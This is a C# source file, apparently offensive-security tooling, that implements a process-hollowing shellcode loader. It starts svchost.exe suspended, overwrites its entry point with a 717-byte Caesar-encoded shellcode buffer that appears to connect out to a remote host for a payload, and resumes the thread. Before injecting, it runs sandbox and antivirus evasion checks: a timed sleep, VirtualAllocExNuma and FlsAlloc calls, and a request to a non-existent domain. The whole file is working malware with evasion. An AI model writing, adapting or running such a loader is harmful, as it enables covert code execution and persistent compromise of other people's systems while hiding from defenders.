using System;
using System.Net;
using System.Runtime.InteropServices;
using static OrangeJuice.Class1;

namespace OrangeJuice
{
    public class Class1
    {
        // Import all structures and Win32 APIs required for process hollowing
        // Great explanation of process hollowing here - https://www.youtube.com/watch?v=aQQT-nYoiJo
        enum PROCESS_INFORMATION_CLASS : Int32
        {
            ProcessBasicInformation = 0,
            ProcessDebugPort = 7,
            ProcessWow64Information = 26,
            ProcessImageFileName = 27,
            ProcessBreakOnTermination = 29,
            ProcessSubsystemInformation = 75
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 ZwQueryInformationProcess(
           IntPtr hProcess,
           PROCESS_INFORMATION_CLASS procInformationClass,
           ref PROCESS_BASIC_INFORMATION procInformation,
           UInt32 ProcInfoLen,
           ref UInt32 retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess, 
            IntPtr lpAddress,
            uint dwSize, 
            UInt32 flAllocationType, 
            UInt32 flProtect, 
            UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);
        public static void runner()
        {
            // Set a timer to bypass common heuristic detections. If the programs execution is fast forwarded and the time does not match, this means that
            // the program may be in a sandboxed environment and the executable is being tested. If so, exit.
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                return;
            }

            // VirtualAllocExNuma and FlsAlloc are a great way to bypass heuristics as they are usually undocumented and hence non-emulated
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null)
            {
                return;
            }

            // In a sandboxed environment, the sandbox wants to make the executable believe that its running successfully, hence will usually return a status
            // 200 even to non-existant URL's. Here we test for that in that we make a request to a non existant URL. If it is successfull, it is clearly being
            // told that. Exit.
            try
            {
                HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://whois1337.com/");
                HttpWebResponse resp = (HttpWebResponse)req.GetResponse();

                if (resp.StatusCode == HttpStatusCode.OK)
                {
                    return;
                }
            } catch (WebException we)
            {
                Console.WriteLine("WebException Raised: ", we.Status);
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // Caesar Cipher encoded payload with a shift value of 2
            byte[] buf = new byte[717] { 0xfe, 0x4a, 0x85, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x54, 0x4a, 0x33, 0xd4, 0x53, 0x67, 0x4a, 0x8d, 0x54, 0x62, 0x4a, 0x8d, 0x54, 0x1a, 0x58, 0x4a, 0x8d, 0x54, 0x22, 0x4a, 0x8d, 0x74, 0x52, 0x4a, 0x11, 0xb9, 0x4c, 0x4c, 0x4f, 0x33, 0xcb, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x04, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe4, 0xef, 0x54, 0x43, 0x53, 0x4a, 0x8d, 0x54, 0x22, 0x8d, 0x44, 0x3e, 0x4a, 0x03, 0xd2, 0x68, 0x83, 0x7a, 0x1a, 0x0d, 0x04, 0x11, 0x87, 0x74, 0x02, 0x02, 0x02, 0x8d, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x69, 0x4a, 0x03, 0xd2, 0x52, 0x8d, 0x4a, 0x1a, 0x46, 0x8d, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0xe5, 0x58, 0x4f, 0x33, 0xcb, 0x4a, 0x01, 0xcb, 0x43, 0x8d, 0x36, 0x8a, 0x4a, 0x03, 0xd8, 0x4a, 0x33, 0xc2, 0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x05, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x8d, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x68, 0x43, 0x8d, 0x0e, 0x4a, 0x46, 0x8d, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x8d, 0x06, 0x8a, 0x43, 0x5a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x60, 0x5b, 0x5c, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x5c, 0x4a, 0x85, 0xee, 0x22, 0x43, 0x54, 0x01, 0xe2, 0x5a, 0x43, 0x5b, 0x5c, 0x4a, 0x8d, 0x14, 0xeb, 0x4d, 0x01, 0x01, 0x01, 0x5f, 0x4a, 0x33, 0xdd, 0x55, 0x4b, 0xc0, 0x79, 0x6b, 0x70, 0x6b, 0x70, 0x67, 0x76, 0x02, 0x43, 0x58, 0x4a, 0x8b, 0xe3, 0x4b, 0xc9, 0xc4, 0x4e, 0x79, 0x28, 0x09, 0x01, 0xd7, 0x55, 0x55, 0x4a, 0x8b, 0xe3, 0x55, 0x5c, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xbc, 0x3c, 0x58, 0x7b, 0xa9, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0x0f, 0x02, 0x02, 0x02, 0x33, 0x32, 0x30, 0x33, 0x32, 0x30, 0x33, 0x37, 0x30, 0x34, 0x33, 0x33, 0x02, 0x5c, 0x4a, 0x8b, 0xc3, 0x4b, 0xc9, 0xc2, 0xbd, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x6c, 0x05, 0x55, 0x4b, 0xbc, 0x59, 0x8b, 0xa1, 0xc8, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0xea, 0xc9, 0x02, 0x02, 0x02, 0x31, 0x6b, 0x53, 0x4c, 0x77, 0x59, 0x43, 0x45, 0x32, 0x51, 0x4c, 0x4a, 0x35, 0x64, 0x61, 0x5c, 0x76, 0x6d, 0x70, 0x63, 0x34, 0x58, 0x53, 0x55, 0x4f, 0x54, 0x55, 0x44, 0x6d, 0x47, 0x5c, 0x4e, 0x6e, 0x7b, 0x6f, 0x74, 0x5a, 0x7a, 0x79, 0x53, 0x76, 0x43, 0x77, 0x36, 0x39, 0x6c, 0x65, 0x53, 0x39, 0x72, 0x7b, 0x44, 0x37, 0x38, 0x5c, 0x48, 0x65, 0x72, 0x49, 0x58, 0x63, 0x38, 0x76, 0x54, 0x66, 0x74, 0x36, 0x4a, 0x4f, 0x6b, 0x69, 0x52, 0x54, 0x79, 0x6a, 0x51, 0x55, 0x49, 0x4f, 0x57, 0x33, 0x75, 0x3a, 0x54, 0x4f, 0x6d, 0x7a, 0x72, 0x4b, 0x57, 0x2f, 0x76, 0x4e, 0x3a, 0x32, 0x7c, 0x6a, 0x70, 0x7b, 0x63, 0x43, 0x36, 0x75, 0x51, 0x58, 0x5c, 0x5a, 0x54, 0x59, 0x7b, 0x6f, 0x34, 0x78, 0x4e, 0x7c, 0x43, 0x38, 0x6d, 0x65, 0x50, 0x3a, 0x73, 0x32, 0x47, 0x7b, 0x36, 0x37, 0x7c, 0x2f, 0x73, 0x5c, 0x56, 0x51, 0x63, 0x71, 0x51, 0x64, 0x4b, 0x58, 0x44, 0x67, 0x45, 0x48, 0x57, 0x50, 0x3b, 0x72, 0x57, 0x3b, 0x51, 0x67, 0x3b, 0x3a, 0x61, 0x36, 0x68, 0x2f, 0x69, 0x5c, 0x6b, 0x6a, 0x75, 0x77, 0x75, 0x50, 0x35, 0x4f, 0x7a, 0x55, 0x52, 0x61, 0x5a, 0x5c, 0x52, 0x38, 0x63, 0x61, 0x71, 0x3b, 0x58, 0x6e, 0x55, 0x6f, 0x37, 0x4f, 0x73, 0x6d, 0x4c, 0x32, 0x33, 0x7c, 0x72, 0x4c, 0x79, 0x43, 0x66, 0x5b, 0x36, 0x02, 0x4a, 0x8b, 0xc3, 0x55, 0x5c, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x55, 0x4a, 0xba, 0x02, 0x04, 0x2a, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0xed, 0x57, 0x30, 0x3d, 0x01, 0xd7, 0x4a, 0x8b, 0xc8, 0x6c, 0x0c, 0x61, 0x55, 0x5c, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x55, 0x55, 0x4b, 0xc9, 0xc4, 0x2f, 0x08, 0x1a, 0x7d, 0x01, 0xd7, 0x87, 0xc2, 0x77, 0x21, 0x4a, 0xc9, 0xc3, 0x8a, 0x15, 0x02, 0x02, 0x4b, 0xbc, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x01, 0xd1, 0x76, 0x04, 0xed, 0xce, 0xea, 0x57, 0x02, 0x02, 0x02, 0x55, 0x5b, 0x6c, 0x42, 0x5c, 0x4b, 0x8b, 0xd3, 0xc3, 0xe4, 0x12, 0x4b, 0xc9, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xbc, 0x5a, 0xa6, 0x55, 0xe7, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x95, 0x55, 0x55, 0x4a, 0x8b, 0xe9, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xdc, 0x4b, 0xc9, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xbc, 0x14, 0x98, 0x8b, 0xe4, 0x02, 0x02, 0x02, 0x02, 0x01, 0xd7, 0x4a, 0x85, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb4, 0x68, 0x8d, 0x09, 0x4a, 0x03, 0xc5, 0x87, 0xc2, 0x77, 0xd4, 0x5a, 0xc5, 0x5a, 0x6c, 0x02, 0x5b, 0x4b, 0xc9, 0xc4, 0xf2, 0xb7, 0xa4, 0x58, 0x01, 0xd7 };

            // Decode the buf array encoded in Caesar Cipher by shifting back a value of 2
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
